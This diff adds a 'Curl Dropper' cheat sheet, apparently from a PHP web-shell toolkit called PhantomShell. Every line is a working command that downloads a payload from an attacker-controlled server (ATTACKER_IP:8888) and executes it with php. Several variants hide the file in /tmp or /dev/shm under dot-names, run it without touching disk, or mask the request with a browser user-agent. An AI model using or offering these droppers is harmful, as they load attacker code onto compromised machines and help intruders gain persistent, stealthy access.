@@ -1,0 +1,21 @@
+# Curl Dropper
+# Host phantom.php on your HTTP server first:
+# cd PhantomShell && python3 -m http.server 8888
+
+# Basic curl dropper
+curl -s http://ATTACKER_IP:8888/phantom.php -o /tmp/.cache.php && php /tmp/.cache.php &
+
+# Pipe directly to PHP (no file on disk)
+curl -s http://ATTACKER_IP:8888/phantom.php | php &
+
+# Silent with nohup
+curl -so /tmp/.c.php http://ATTACKER_IP:8888/phantom.php && nohup php /tmp/.c.php >/dev/null 2>&1 &
+
+# Minimal loader
+curl -s http://ATTACKER_IP:8888/loader.php | php &
+
+# With custom user-agent
+curl -sA 'Mozilla/5.0' http://ATTACKER_IP:8888/phantom.php | php &
+
+# Via /dev/shm
+curl -so /dev/shm/.c http://ATTACKER_IP:8888/phantom.php && php /dev/shm/.c &
